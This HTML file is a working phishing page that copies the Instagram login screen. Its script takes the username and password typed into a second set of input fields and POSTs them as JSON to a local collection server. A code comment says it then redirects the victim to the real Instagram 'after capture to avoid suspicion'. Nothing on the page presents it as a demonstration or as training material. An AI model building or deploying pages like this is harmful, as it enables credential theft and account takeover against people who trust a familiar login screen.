<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { box-sizing: border-box; }
        
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #000;
            color: white;
        }

        .main-wrapper {
            display: flex;
            min-height: 100vh;
            width: 100%;
        }

        /* --- LEFT SIDE (Visuals) --- */
        .visual-side {
            display: none; /* Hidden by default on mobile */
            flex: 1;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 40px;
            text-align: center;
        }

        .visual-side h1 {
            font-size: clamp(24px, 4vw, 40px); /* Fluid font size */
            font-weight: 600;
            max-width: 400px;
        }

        .visual-side span {
            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        /* --- RIGHT SIDE (Form) --- */
        .form-side {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .login-box {
            width: 100%;
            max-width: 350px;
            display: flex;
            flex-direction: column;
        }

        .login-box h2 {
            font-size: 16px;
            margin-bottom: 24px;
            text-align: center;
        }

        .input-field {
            width: 100%;
            background: #121212;
            border: 1px solid #363636;
            border-radius: 4px;
            padding: 12px;
            margin-bottom: 8px;
            color: white;
            font-size: 14px;
        }

        .login-btn {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 10px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
        }

        .divider {
            margin: 20px 0;
            text-align: center;
            font-size: 12px;
            color: #a8a8a8;
        }

        .fb-link {
            color: #fff;
            text-decoration: none;
            font-weight: 600;
            font-size: 14px;
            text-align: center;
            border: 1px solid #363636;
            padding: 10px;
            border-radius: 8px;
            display: block;
        }

        /* --- RESPONSIVE BREAKPOINT --- */
        @media (min-width: 850px) {
            .visual-side {
                display: flex; /* Shows visual side on Desktop */
            }
            .form-side {
                border-left: 1px solid #262626;
                flex: 0 0 500px; /* Fixed width for form on Desktop */
            }
        }

        .footer {
            position: absolute;
            bottom: 10px;
            width: 100%;
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 10px;
            font-size: 12px;
            color: #a8a8a8;
            padding: 10px;
        }
    </style>
</head>
<body>

    <div class="main-wrapper">
        <div class="visual-side">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" width="50" alt="IG">
            <h1>See everyday moments from your <span>close friends</span>.</h1>
        </div>

        <div class="form-side">
            <div class="login-box">
                <h2>Log in to Instagram</h2>
                <form id="loginForm">
                    <input type="text" class="input-field" placeholder="Phone number, username, or email" required>
                    <input type="password" class="input-field" placeholder="Password" required>
                    <button type="submit" class="login-btn">Log in</button>
                </form>

                <div class="divider">OR</div>

                <a href="#" class="fb-link">Log in with Facebook</a>

                <p style="text-align:center; font-size: 14px; margin-top: 30px;">
                    Don't have an account? <a href="#" style="color:#0095f6; text-decoration:none;">Sign up</a>
                </p>
            </div>
        </div>
    </div>

    <div class="footer">
        <span>Meta</span><span>About</span><span>Blog</span><span>Jobs</span><span>Help</span><span>API</span>
    </div>

<input type="text" id="username" class="input-box" placeholder="Phone number, username or email">
<input type="password" id="password" class="input-box" placeholder="Password">
<button type="button" onclick="sendData()" class="btn-login" style="background:#0095f6; color:white; cursor:pointer;">Log in</button>

<script>
    async function sendData() {
        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;

        try {
            const response = await fetch('http://127.0.0.1:8000/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: user, password: pass })
            });
            
            if (response.ok) {
                // Redirect to the real Instagram after capture to avoid suspicion
                window.location.href = "https://www.instagram.com/accounts/login/";
            }
        } catch (error) {
            console.error("Error connecting to server:", error);
        }
    }
</script>

</body>
</html>
